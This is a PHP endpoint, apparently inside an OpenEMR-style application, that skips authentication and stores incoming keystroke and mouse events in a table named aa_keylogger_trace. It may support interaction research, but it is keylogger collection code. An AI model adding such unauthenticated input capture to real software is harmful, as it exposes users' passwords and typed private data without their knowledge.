<?php

$ignoreAuth = true;
require_once(dirname(__FILE__) . "/../sites/default/sqlconf.php");

$entityBody = file_get_contents('php://input');
if (!empty($entityBody)) {
    // // log to file
    // $file = fopen('keypresses.txt', 'a+');
    // fwrite($file, $entityBody . PHP_EOL);
    // fclose($file);

    // log to sql
    $mysqli = new mysqli($host, $login, $pass, $dbase, $port);

    /* check connection */
    if (mysqli_connect_errno()) {
        printf("Connect failed: %s\n", mysqli_connect_error());
        exit();
    }

    $decoded = json_decode($entityBody);
    $user = $decoded->user;
    $stmt = $mysqli->prepare("INSERT INTO aa_keylogger_trace ( user, time, type, data, x, y ) VALUES ( ?, ?, ?, ?, ?, ? )");
    foreach ($decoded->events as $event) {
        if (property_exists($event, 'data')) {
            $data = $event->data;
        } else {
            $data = '';
        }
        if (property_exists($event, 'x')) {
            $x = $event->x;
            $y = $event->y;
        } else {
            $x = -1;
            $y = -1;
        }
        $stmt->bind_param('ssssii', $user, $event->time, $event->type, $data, $x, $y);
        $stmt->execute();
    }
    print("Successfully Logged.");
} else {
    print("EntiyBody is empty.");
}
?>

